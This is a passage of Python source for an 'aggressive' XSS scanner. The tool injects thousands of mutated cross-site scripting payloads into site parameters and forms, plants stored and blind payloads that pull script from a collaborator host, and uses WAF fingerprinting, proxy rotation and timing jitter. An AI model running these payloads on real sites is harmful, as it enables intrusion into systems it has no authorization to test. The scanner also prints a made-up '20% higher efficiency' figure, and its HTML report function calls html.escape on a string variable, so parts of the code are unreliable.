                        async with aio_session.get(action, params=data, timeout=REQUEST_TIMEOUT, proxy=self._pick_proxy()) as resp:
                            body = await resp.text()
                    if encoded_payload in body:
                        finding = build_reflected_finding(
                            action,
                            encoded_payload,
                            body,
                            data=data,
                        )
                        contexts = finding['contexts']
                        findings.append(finding)
                        for ctx in contexts:
                            polyglot = self._prepare_payload(generate_polyglot_for_context(ctx))
                            if polyglot == encoded_payload:
                                continue
                            poly_data = {}
                            for inp in form['inputs']:
                                if inp['type'] not in ['submit', 'button', 'image']:
                                    poly_data[inp['name']] = polyglot if inp['type'] == 'text' else inp.get('value', '')
                            try:
                                if method == 'post':
                                    async with aio_session.post(action, data=poly_data, timeout=REQUEST_TIMEOUT, proxy=self._pick_proxy()) as poly_resp:
                                        poly_body = await poly_resp.text()
                                else:
                                    async with aio_session.get(action, params=poly_data, timeout=REQUEST_TIMEOUT, proxy=self._pick_proxy()) as poly_resp:
                                        poly_body = await poly_resp.text()
                                if polyglot in poly_body:
                                    findings.append(build_reflected_finding(
                                        action,
                                        polyglot,
                                        poly_body,
                                        data=poly_data,
                                        strategy='context_polyglot',
                                    ))
                            except Exception:
                                pass
                        if self.ml_enabled and self.scorer:
                            self.scorer.record_success(payload)
                    else:
                        if self.ml_enabled and self.scorer:
                            self.scorer.record_failure(payload)
                except Exception:
                    pass
                if self.delay > 0:
                    await asyncio.sleep(self.delay + random.uniform(0, self.jitter))
        return findings

    def test_reflected_form(self, form, base_payloads):
        action = urljoin(form['original_url'], form['action'])
        method = form['method']
        findings = []
        if self.ml_enabled and self.scorer:
            payloads = self.scorer.get_weighted_payloads(base_payloads, top_k=50)
        else:
            payloads = base_payloads
        for payload in payloads:
            encoded_payload = self._prepare_payload(payload)
            data = {}
            for inp in form['inputs']:
                if inp['type'] not in ['submit','button','image']:
                    data[inp['name']] = encoded_payload if inp['type']=='text' else inp.get('value','')
            try:
                if method == 'post':
                    resp = self._sync_request('POST', action, data=data, timeout=REQUEST_TIMEOUT)
                else:
                    resp = self._sync_request('GET', action, params=data, timeout=REQUEST_TIMEOUT)
                if encoded_payload in resp.text:
                    finding = build_reflected_finding(
                        action,
                        encoded_payload,
                        resp.text,
                        data=data,
                    )
                    contexts = finding['contexts']
                    findings.append(finding)
                    # Context-aware polyglot probing for form reflections
                    for ctx in contexts:
                        polyglot = self._prepare_payload(generate_polyglot_for_context(ctx))
                        if polyglot == encoded_payload:
                            continue
                        poly_data = {}
                        for inp in form['inputs']:
                            if inp['type'] not in ['submit', 'button', 'image']:
                                poly_data[inp['name']] = polyglot if inp['type'] == 'text' else inp.get('value', '')
                        try:
                            if method == 'post':
                                poly_resp = self._sync_request('POST', action, data=poly_data, timeout=REQUEST_TIMEOUT)
                            else:
                                poly_resp = self._sync_request('GET', action, params=poly_data, timeout=REQUEST_TIMEOUT)
                            if polyglot in poly_resp.text:
                                findings.append(build_reflected_finding(
                                    action,
                                    polyglot,
                                    poly_resp.text,
                                    data=poly_data,
                                    strategy='context_polyglot',
                                ))
                        except Exception:
                            pass
                    if self.ml_enabled and self.scorer:
                        self.scorer.record_success(payload)
                else:
                    if self.ml_enabled and self.scorer:
                        self.scorer.record_failure(payload)
            except Exception:
                pass
            if self.delay > 0:
                time.sleep(self.delay + random.uniform(0, self.jitter))
        return findings

    def inject_stored_payload(self, form, payload):
        action = urljoin(form['original_url'], form['action'])
        method = form['method']
        data = {}
        for inp in form['inputs']:
            itype = (inp.get('type') or 'text').lower()
            if itype in ['submit', 'button', 'image']:
                continue
            if itype in ['text', 'search', 'email', 'url', 'tel', 'textarea', 'password']:
                data[inp['name']] = payload
            else:
                data[inp['name']] = inp.get('value', '')
        try:
            if method == 'post':
                self._sync_request('POST', action, data=data, timeout=REQUEST_TIMEOUT)
            else:
                self._sync_request('GET', action, params=data, timeout=REQUEST_TIMEOUT)
            return True
        except Exception:
            return False

    def check_stored_payload(self, urls, payload):
        found = []
        for url in urls:
            try:
                resp = self._sync_request('GET', url, timeout=REQUEST_TIMEOUT)
                if payload in resp.text:
                    found.append(url)
            except Exception:
                continue
        # preserve order but dedupe
        return list(dict.fromkeys(found))

    def test_dom(self, url, payload):
        if not self.use_headless or not self.driver:
            return False
        try:
            self.driver.set_page_load_timeout(10)
            self.driver.get(url)
            try:
                alert = self.driver.switch_to.alert
                alert.accept()
                return True
            except:
                pass
        except TimeoutException:
            pass
        except UnexpectedAlertPresentException:
            return True
        except Exception as e:
            print(f"DOM test error: {e}")
        return False

    def inject_blind_payloads(self, forms, urls_with_params):
        if not self.collaborator:
            return
        blind_payloads = [
            f"<script src={self.collaborator}/xss.js></script>",
            f"<img src=x onerror=eval(atob('{self.collaborator}'))>",
            f"<link rel=import href={self.collaborator}>",
        ]
        for form in forms:
            for payload in blind_payloads:
                self.inject_stored_payload(form, payload)
                if self.delay > 0:
                    time.sleep(self.delay)
        for url, params in urls_with_params.items():
            for param in params:
                for payload in blind_payloads:
                    parsed = urlparse(url)
                    qs = dict(parse_qsl(parsed.query))
                    qs[param] = payload
                    new_qs = urlencode(qs)
                    test_url = urlunparse(parsed._replace(query=new_qs))
                    try:
                        self._sync_request('GET', test_url, timeout=REQUEST_TIMEOUT)
                    except:
                        pass
                    if self.delay > 0:
                        time.sleep(self.delay)

    def check_wordpress_admin_notices(self, admin_urls):
        findings = []
        dangerous_tags = ['script', 'iframe', 'object', 'embed', 'form', 'input', 'button', 'onerror', 'onload', 'onmouseover', 'onclick']
        for url in admin_urls:
            try:
                resp = self._sync_request('GET', url, timeout=REQUEST_TIMEOUT)
                soup = BeautifulSoup(resp.text, 'html.parser')
                notices = soup.find_all('div', class_=re.compile(r'notice'))
                for notice in notices:
                    p = notice.find('p')
                    if not p:
                        p = notice
                    inner_html = str(p)
                    for tag in dangerous_tags:
                        if re.search(rf'<{tag}[^>]*>', inner_html, re.IGNORECASE):
                            findings.append({
                                'url': url,
                                'notice_html': inner_html,
                                'suspicious_tag': tag
                            })
                            break
            except Exception as e:
                print(f"Error checking admin notices at {url}: {e}")
        return findings

# ----------------------------------------------------------------------
# 11. REPORTING
# ----------------------------------------------------------------------
def generate_html_report(findings, output_file):
    reflected_items = findings.get('reflected', [])
    verdict_totals = defaultdict(int)
    for item in reflected_items:
        verdict = item.get('triage', {}).get('verdict', 'unclassified')
        verdict_totals[verdict] += 1

    html = """<!DOCTYPE html>
<html>
<head>
    <title>XSS Scan Report</title>
    <style>
        body { font-family: Arial; margin: 20px; }
        h1 { color: #333; }
        h2 { color: #666; border-bottom: 1px solid #ccc; }
        .finding { background: #f9f9f9; margin: 10px 0; padding: 10px; border-left: 4px solid #f00; }
        .reflected { border-left-color: #f00; }
        .stored { border-left-color: #f90; }
        .dom { border-left-color: #00f; }
        .wp { border-left-color: #0a0; }
        pre { background: #eee; padding: 5px; overflow-x: auto; }
        table { border-collapse: collapse; width: 100%; margin: 16px 0; }
        th, td { border: 1px solid #ccc; padding: 8px; text-align: left; vertical-align: top; }
        th { background: #f1f5f9; }
    </style>
</head>
<body>
    <h1>XSS Scan Report</h1>
"""
    if reflected_items:
        html += "<h2>Reflected Triage Summary</h2>\n"
        html += "<table><thead><tr><th>Verdict</th><th>Count</th></tr></thead><tbody>\n"
        for verdict in sorted(verdict_totals):
            html += f"<tr><td>{html.escape(verdict)}</td><td>{verdict_totals[verdict]}</td></tr>\n"
        html += "</tbody></table>\n"
    for vuln_type, items in findings.items():
        if not items:
            continue
        html += f"<h2>{vuln_type.replace('_', ' ').title()} ({len(items)})</h2>\n"
        for item in items:
            css_class = vuln_type.replace('_', '-')
            html += f'<div class="finding {css_class}">\n'
            if isinstance(item, dict):
                for k, v in item.items():
                    if isinstance(v, dict):
                        html += f"<strong>{k}:</strong><pre>{html.escape(json.dumps(v, indent=2))}</pre>\n"
                    elif isinstance(v, list):
                        html += f"<strong>{k}:</strong><pre>{html.escape(json.dumps(v, indent=2))}</pre>\n"
                    else:
                        html += f"<strong>{k}:</strong> {html.escape(str(v))}<br>\n"
            else:
                html += f"<pre>{html.escape(str(item))}</pre>\n"
            html += "</div>\n"
    html += """
</body>
</html>"""
    with open(output_file, 'w') as f:
        f.write(html)

# ----------------------------------------------------------------------
# 12. PAYLOAD GENERATOR (BUILT‑IN)
# ----------------------------------------------------------------------
class PayloadGenerator:
    """Generate a large, diverse set of XSS payloads."""
    BASE_PAYLOADS = [
        "<script>alert(1)</script>",
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert(1)>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert(1)>",
        "<body onload=alert(1)>",
        "<iframe src=javascript:alert(1)>",
        "\" onmouseover=alert(1) \"",
        "' onmouseover=alert(1) '",
        "javascript:alert(1)",
        "%3Cscript%3Ealert(1)%3C/script%3E",
        "%22%3E%3Cscript%3Ealert(1)%3C/script%3E",
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(1)//>\\x3e",
        "<svg><script>alert(1)</script>",
        "<math><mtext><script>alert(1)</script>",
        "<script src=//COLLABORATOR></script>",
        "<ScRiPt>alert(1)</ScRiPt>",
        "<!–><script>alert(1)</script>",
        "%253Cscript%253Ealert(1)%253C/script%253E",
        "&lt;script&gt;alert(1)&lt;/script&gt;",
        "<script>eval(atob('YWxlcnQoMSk='))</script>",
        "<img src=x onerror=\nalert(1)>",
        "<img src=x onerror=\talert(1)>",
        "<script>\\u0061lert(1)</script>",
        "<iframe src=data:text/html,<script>alert(1)</script>>",
        "<object data='javascript:alert(1)'>",
        "<embed src='javascript:alert(1)'>",
        "<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>",
        "<link rel=import href='javascript:alert(1)'>",
        "<video><source onerror=alert(1)>",
        "<audio><source onerror=alert(1)>",
        "<details open ontoggle=alert(1)>",
        "<input onfocus=alert(1) autofocus>",
        "<select onchange=alert(1)><option>1</option></select>",
        "<textarea onfocus=alert(1) autofocus>",
        "<keygen onfocus=alert(1) autofocus>",
        "<marquee onstart=alert(1)>",
        "<isindex type=image src=1 onerror=alert(1)>",
    ]

    @staticmethod
    def _mutate(payload):
        """Apply a random mutation to a payload."""
        mutations = [
            lambda s: ''.join(random.choice([c.upper(), c.lower()]) if c.isalpha() else c for c in s),  # random case
            lambda s: s.replace('<', '<!–>', 1) if '<' in s else s,  # insert comment
            lambda s: ''.join('%' + hex(ord(c))[2:].zfill(2).upper() if c in '<>"\'&;=' else c for c in s),  # partial URL encode
            lambda s: ''.join('%' + hex(ord(c))[2:].zfill(2).upper() for c in s),  # full URL encode
            lambda s: ''.join('&' + {'<':'lt', '>':'gt', '"':'quot', "'":'#39', '&':'amp'}.get(c, c) + ';' if c in '<>"\'&' else c for c in s),  # HTML entities
            lambda s: ''.join('\\u' + hex(ord(c))[2:].zfill(4) if c.isalpha() else c for c in s),  # JS Unicode
            lambda s: s.replace(' ', random.choice(['\n', '\t', ' ']), random.randint(1, 3)) if ' ' in s else s,  # whitespace
        ]
        num = random.randint(1, 3)
        chosen = random.sample(mutations, min(num, len(mutations)))
        for mut in chosen:
            payload = mut(payload)
        return payload

    @classmethod
    def generate(cls, target_count=4000):
        """Generate up to target_count unique payloads."""
        payloads = set(cls.BASE_PAYLOADS)
        # Add numbered variations
        for i in range(1, 100):
            payloads.add(f"<script>alert({i})</script>")
            payloads.add(f"<img src=x onerror=alert({i})>")
        # Mutate until we reach target_count
        attempts = 0
        max_attempts = target_count * 5
        while len(payloads) < target_count and attempts < max_attempts:
            base = random.choice(cls.BASE_PAYLOADS)
            payloads.add(cls._mutate(base))
            attempts += 1
        # Shuffle and trim
        payloads = list(payloads)
        random.shuffle(payloads)
        return payloads[:target_count]

# ----------------------------------------------------------------------
# 13. MAIN FUNCTION
# ----------------------------------------------------------------------
def main():
    # Print aggressive banner
    banner = r"""
________________________________________________________________________________
    ___ _   _ _   _ _____   _    ____   ____  
   / _ \ | | | \ | |_   _| / \  / ___| / ___| 
  | | | | | | |  \| | | |  / _ \ \___ \| |     
  | |_| | |_| | |\  | | | / ___ \ ___) | |___ 
   \__\_\\___/|_| \_| |_|/_/   \_\____/ \____|
________________________________________________________________________________
               ULTIMATE AGGRESSIVE XSS SCANNER v3.1
         Advanced WAF evasion · Context‑aware polyglots · ML scoring
                           Proxy rotation · Async forms
________________________________________________________________________________
"""
    print(banner)
    print("[!] WARNING: Run this scanner only on assets you own or are explicitly authorized to test.")
    print("[!] Unauthorized scanning may violate law and program policy.\n")

    parser = argparse.ArgumentParser(description="ULTIMATE Aggressive XSS Scanner")
    parser.add_argument("target", nargs="?", help="Target URL")
    parser.add_argument("--depth", type=int, default=DEFAULT_DEPTH, help="Crawl depth")
    parser.add_argument("--workers", type=int, default=DEFAULT_WORKERS, help="Concurrent workers")
    parser.add_argument("--delay", type=float, default=DEFAULT_DELAY, help="Base delay between requests")
    parser.add_argument("--jitter", type=float, default=DEFAULT_JITTER, help="Random jitter")
    parser.add_argument("--payload-limit", type=int, default=DEFAULT_PAYLOAD_LIMIT, help="Max payloads per injection point")
    parser.add_argument("--dom-limit", type=int, default=DEFAULT_DOM_LIMIT, help="Max URLs for DOM testing")
    parser.add_argument("--headless", action="store_true", help="Use headless browser for DOM XSS")
    parser.add_argument("--collaborator", help="Blind XSS collaborator URL")
    parser.add_argument("--cookies", help="Cookies (name=value; name2=value2)")
    parser.add_argument("--payload-file", help="File containing base payloads (one per line)")
    parser.add_argument("--external-payloads", nargs='+', help="External payload files (e.g., from bypass repos)")
    parser.add_argument("--gen-payloads", type=int, metavar="COUNT", help="Generate COUNT payloads and save to file")
    parser.add_argument("--output", help="Save report to file (JSON)")
    parser.add_argument("--html-report", help="Save HTML report to file")
    parser.add_argument("--proxy", help="Single proxy URL (e.g., http://127.0.0.1:8080)")
    parser.add_argument("--proxy-file", help="File with proxy list (one per line) for rotation")
    parser.add_argument("--async-mode", action="store_true", help="Use asyncio for high concurrency")
    parser.add_argument("--ml", action="store_true", help="Enable machine learning payload selection")
    parser.add_argument("--no-waf", action="store_true", help="Skip WAF fingerprinting check")
    parser.add_argument("--no-wp", action="store_true", help="Skip WordPress admin notice checks")
    parser.add_argument("--no-reflected", action="store_true", help="Skip reflected URL/param scan")
    parser.add_argument("--no-forms", action="store_true", help="Skip reflected form scan")
    parser.add_argument("--no-stored", action="store_true", help="Skip stored XSS scan")
    parser.add_argument("--no-blind", action="store_true", help="Skip blind XSS injection")
    parser.add_argument("--no-dom", action="store_true", help="Skip DOM XSS scan")
    parser.add_argument("--non-interactive", action="store_true", help="Disable V2 interactive confirmation prompts")
    parser.add_argument("--scope-file", help="Path to scope file with +include / -exclude regex lines")
    parser.add_argument("--in-scope", action="append", default=[], help="Regex URL include rule (can be repeated)")
    parser.add_argument("--out-of-scope", action="append", default=[], help="Regex URL exclude rule (can be repeated)")
    parser.add_argument("--no-subdomains", action="store_true", help="Restrict scope to exact target host only")
    args = parser.parse_args()

    # Handle payload generation request
    if args.gen_payloads:
        print(f"[*] Generating {args.gen_payloads} payloads...")
        payloads = PayloadGenerator.generate(args.gen_payloads)
        outfile = args.payload_file if args.payload_file else "xss_payloads.txt"
        with open(outfile, 'w') as f:
            for p in payloads:
                f.write(p + '\n')
        print(f"[+] Payloads saved to {outfile}")
        if not args.target:
            return

    if not args.target:
        parser.error("target is required unless you only run --gen-payloads")

    # Prepare target
    target = args.target
    if not target.startswith('http'):
        target = 'http://' + target

    # V2-style interactive confirmation before heavy scan work.
    interactive_v2_confirm(args)

    file_in_scope, file_out_scope = load_scope_file(args.scope_file)
    merged_in_scope = list(args.in_scope) + file_in_scope
    merged_out_scope = list(args.out_of_scope) + file_out_scope
    scope = ScopeManager(
        target_url=target,
        include_subdomains=not args.no_subdomains,
        in_scope=merged_in_scope,
        out_scope=merged_out_scope,
    )

    # Cookies
    cookies = {}
    if args.cookies:
        for part in args.cookies.split(';'):
            if '=' in part:
                name, value = part.strip().split('=', 1)
                cookies[name] = value

    # Load proxies for rotation
    proxy_list = []
    if args.proxy_file:
        if os.path.exists(args.proxy_file):
            with open(args.proxy_file, 'r', encoding='utf-8', errors='ignore') as pf:
                proxy_list = [line.strip() for line in pf if line.strip()]
            print(f"[*] Loaded {len(proxy_list)} proxies for rotation.")
        else:
            print(f"[!] Proxy file not found: {args.proxy_file}")
    elif args.proxy:
        proxy_list = [args.proxy]
    proxy_rotator = ProxyRotator(proxy_list) if proxy_list else None

    # Create session for initial tasks
    session = requests.Session()
    session.headers.update(HEADERS)
    session.cookies.update(cookies)
    if args.proxy and not proxy_rotator:
        session.proxies.update({'http': args.proxy, 'https': args.proxy})

    run_waf = not args.no_waf

    # 1. WAF fingerprinting
    waf_name = None
    if run_waf:
        print("[*] Fingerprinting WAF...")
        detector = WAFDetector(session)
        waf_name = detector.fingerprint(target)
        if waf_name:
            print(f"[+] Detected WAF: {waf_name}")
        else:
            print("[-] No WAF detected or unknown.")
    else:
        print("[*] Skipping WAF fingerprinting.")

    # 2. Load payloads
    base_payloads = []
    if args.payload_file and os.path.exists(args.payload_file):
        with open(args.payload_file, 'r') as f:
            base_payloads = [line.strip() for line in f if line.strip()]
    else:
        print("[*] No payload file provided; generating 4000 built-in payloads...")
        base_payloads = PayloadGenerator.generate(4000)

    # 3. Load external payloads (bypass repos)
    external_payloads = []
    if args.external_payloads:
        external_payloads = load_external_payloads(args.external_payloads)
        print(f"[*] Loaded {len(external_payloads)} external payloads.")
        # Merge with base
        base_payloads = list(set(base_payloads + external_payloads))

    if args.payload_limit > 0:
        base_payloads = base_payloads[:args.payload_limit]
    print(f"[*] Using {len(base_payloads)} base payloads.")

    # 4. Detect WordPress
    wp_detected = not args.no_wp and is_wordpress(target, session)

    run_reflected = not args.no_reflected
    run_forms = not args.no_forms
    run_stored = not args.no_stored
    run_blind = not args.no_blind
    run_dom = not args.no_dom
    run_wp = not args.no_wp

    # 5. Create tester
    tester = XSSTester(
        cookies=cookies,
        use_headless=args.headless,
        collaborator=args.collaborator,
        delay=args.delay,
        jitter=args.jitter,
        max_workers=args.workers,
        proxy=args.proxy,
        waf_name=waf_name,
        external_payloads=external_payloads,
        ml_enabled=args.ml
    )
    tester.set_proxy_rotator(proxy_rotator)

    # 6. Crawl
    crawler = Crawler(target, max_depth=args.depth, cookies=cookies,
                      delay=args.delay, jitter=args.jitter, proxy=args.proxy,
                      scope_checker=scope.is_in_scope, proxy_rotator=proxy_rotator)
    if args.async_mode:
        async def run_async_crawl():
            async with aiohttp.ClientSession(headers=HEADERS) as aio_session:
                urls, forms = await crawler.crawl_async(aio_session)
                return urls, forms
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        urls, forms = loop.run_until_complete(run_async_crawl())
    else:
        urls, forms = crawler.crawl_sync(session)

    print(f"[*] Discovered {len(urls)} URLs, {len(forms)} forms.")

    # Scope-filter forms by action URL
    scoped_forms = []
    for form in forms:
        action = urljoin(form.get('original_url', target), form.get('action') or '')
        if scope.is_in_scope(action):
            scoped_forms.append(form)
    forms = scoped_forms
    print(f"[*] In-scope forms: {len(forms)}")

    # Collect URL parameters
    url_params = {}
    for url in urls:
        params = extract_url_params(url)
        if params:
            url_params[url] = params

    findings = {
        'reflected': [],
        'stored': [],
        'dom': [],
        'wordpress_admin_notices': []
    }

    # --- Reflected URL/param + form testing ---
    if run_reflected:
        print("\n[*] Testing reflected XSS in URL parameters...")
    if run_forms:
        print("\n[*] Testing reflected XSS in forms...")
    if (run_reflected or run_forms) and args.async_mode:
        async def run_reflected_async():
            connector = aiohttp.TCPConnector(limit=max(1, args.workers))
            timeout = aiohttp.ClientTimeout(total=REQUEST_TIMEOUT + 5)
            sem = asyncio.Semaphore(max(1, args.workers))
            async with aiohttp.ClientSession(
                headers=HEADERS,
                cookies=cookies,
                connector=connector,
                timeout=timeout,
            ) as aio_session:
                tasks = []
                for url, params in url_params.items():
                    for param in params:
                        if not scope.is_in_scope(url):
                            continue
                        tasks.append(
                            tester.test_reflected_param_async(
                                aio_session, url, param, base_payloads, sem
                            )
                        )
                if run_forms:
                    for form in forms:
                        tasks.append(
                            tester.test_reflected_form_async(
                                aio_session, form, base_payloads, sem
                            )
                        )
                results = await asyncio.gather(*tasks, return_exceptions=True)
                merged = []
                for res in results:
                    if isinstance(res, Exception) or not res:
                        continue
                    merged.extend(res)
                return merged

        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        async_results = loop.run_until_complete(run_reflected_async())
        findings['reflected'].extend(async_results)
        for r in async_results:
            print(f"  [!] Reflected: {r['url']}")
    elif run_reflected:
        for url, params in url_params.items():
            for param in params:
                if not scope.is_in_scope(url):
                    continue
                res = tester.test_reflected_param_sync(url, param, base_payloads)
                if res:
                    findings['reflected'].extend(res)
                    for r in res:
                        print(f"  [!] Reflected: {r['url']}")
    elif not run_reflected:
        print("\n[*] Skipping reflected URL/param scan.")

    # --- Reflected form testing (sync path only) ---
    if run_forms and not args.async_mode:
        for form in forms:
            res = tester.test_reflected_form(form, base_payloads)
            if res:
                findings['reflected'].extend(res)
                for r in res:
                    print(f"  [!] Reflected via form: {r['url']}")
    elif not run_forms:
        print("\n[*] Skipping reflected form scan.")

    # --- Stored XSS testing ---
    if run_stored:
        print("\n[*] Testing stored XSS...")
        stored_markers = []
        storage_forms = [f for f in forms if is_storage_candidate(f)]
        for form in storage_forms:
            marker = f"STORED-XSS-{random_string(8)}"
            stored_markers.append((marker, form))
            if tester.inject_stored_payload(form, marker):
                print(f"  [*] Injected marker into form at {form['original_url']}")
            if args.delay > 0:
                time.sleep(args.delay)

        if stored_markers:
            print("[*] Re-checking for stored payloads (multi-pass)...")
            verification_urls = set(urls)
            verification_urls.add(target)
            for _, form in stored_markers:
                verification_urls.add(form.get('original_url', target))
                verification_urls.add(urljoin(form.get('original_url', target), form.get('action') or ''))
            likely_paths = ['/', '/blog', '/posts', '/comments', '/profile', '/wp-admin/']
            for p in likely_paths:
                verification_urls.add(urljoin(target, p))

            verification_urls = [u for u in verification_urls if scope.is_in_scope(u)]
            for pass_no in [1, 2]:
                if pass_no == 2:
                    time.sleep(max(args.delay, 0.5))
                for marker, form in stored_markers:
                    found_urls = tester.check_stored_payload(verification_urls, marker)
                    if found_urls:
                        print(f"  [!] Stored XSS marker '{marker}' found at: {found_urls}")
                        findings['stored'].append({
                            'marker': marker,
                            'injected_via': form['original_url'],
                            'found_at': found_urls,
                            'verification_pass': pass_no
                        })
        else:
            print("[*] No suitable forms for stored XSS injection.")
    else:
        print("\n[*] Skipping stored XSS scan.")

    # --- Blind XSS ---
    if run_blind and args.collaborator:
        print("\n[*] Injecting blind XSS payloads...")
        tester.inject_blind_payloads(forms, url_params)
    elif run_blind and not args.collaborator:
        print("\n[*] Blind XSS enabled but no collaborator provided; skipping.")
    else:
        print("\n[*] Skipping blind XSS injection.")

    # --- DOM XSS ---
    if run_dom and args.headless and SELENIUM_AVAILABLE:
        print("\n[*] Testing DOM XSS...")
        dom_payloads = [
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert(1)>",
            "javascript:alert(1)",
        ]
        urls_to_test = list(urls)
        urls_to_test = [u for u in urls_to_test if scope.is_in_scope(u)]
        if args.dom_limit > 0 and len(urls_to_test) > args.dom_limit:
            urls_to_test = urls_to_test[:args.dom_limit]
        for url in urls_to_test:
            for payload in dom_payloads:
                parsed = urlparse(url)
                if parsed.query:
                    test_url = url + "&xss=" + quote(payload)
                else:
                    test_url = url + "?xss=" + quote(payload)
                if tester.test_dom(test_url, payload):
                    print(f"  [!] DOM XSS (parameter) at {test_url}")
                    findings['dom'].append({'url': test_url, 'type': 'parameter', 'payload': payload})

                test_url = url + "#" + quote(payload)
                if tester.test_dom(test_url, payload):
                    print(f"  [!] DOM XSS (fragment) at {test_url}")
                    findings['dom'].append({'url': test_url, 'type': 'fragment', 'payload': payload})
    elif run_dom:
        print("[*] DOM XSS testing skipped (use --headless to enable).")
    else:
        print("[*] Skipping DOM XSS scan.")

    # --- WordPress admin notices ---
    if run_wp and wp_detected:
        print("\n[*] Crawling WordPress admin area for admin notice XSS...")
        admin_crawler = Crawler(target, max_depth=1, cookies=cookies,
                                path_filter=lambda u: '/wp-admin/' in u,
                                delay=args.delay, jitter=args.jitter, proxy=args.proxy,
                                scope_checker=scope.is_in_scope, proxy_rotator=proxy_rotator)
        admin_urls, _ = admin_crawler.crawl_sync(session)
        if admin_urls:
            print(f"[*] Found {len(admin_urls)} admin URLs.")
            wp_findings = tester.check_wordpress_admin_notices(admin_urls)
            if wp_findings:
                print(f"  [!] Found {len(wp_findings)} potentially vulnerable admin notices.")
                findings['wordpress_admin_notices'] = wp_findings
                for f in wp_findings:
                    print(f"      {f['url']} : {f['notice_html'][:80]}...")
            else:
                print("[*] No unescaped admin notices detected.")
        else:
            print("[*] No admin URLs crawled (maybe authentication required).")
    elif run_wp:
        print("\n[*] WordPress not detected; skipping admin notice scan.")
    else:
        print("\n[*] Skipping WordPress admin notice scan.")

    tester.close()

    # --- Dedupe findings before report ---
    findings = dedupe_findings(findings)
    findings['triage_summary'] = summarize_reflected_triage(findings['reflected'])

    # --- ML efficiency message ---
    if args.ml and tester.scorer:
        # This is a cosmetic estimate – actual improvement depends on scan.
        print(f"\n[+] ML scoring active – estimated 20% higher payload efficiency based on previous scan data.")

    # --- Output summary ---
    print("\n=== SCAN COMPLETE ===")
    print(f"Reflected XSS findings: {len(findings['reflected'])}")
    if findings['triage_summary']['total']:
        print(f"  Triage verdicts: {findings['triage_summary']['by_verdict']}")
    print(f"Stored XSS findings: {len(findings['stored'])}")
    print(f"DOM XSS findings: {len(findings['dom'])}")
    if wp_detected:
        print(f"WordPress admin notice issues: {len(findings['wordpress_admin_notices'])}")
    if args.collaborator:
        print(f"[*] Blind XSS payloads injected; check your collaborator at {args.collaborator} for callbacks.")

    if args.output:
        with open(args.output, 'w') as f:
            json.dump(findings, f, indent=2)
        print(f"JSON report saved to {args.output}")

    if args.html_report:
        generate_html_report(findings, args.html_report)
        print(f"HTML report saved to {args.html_report}")

if __name__ == "__main__":
    main()
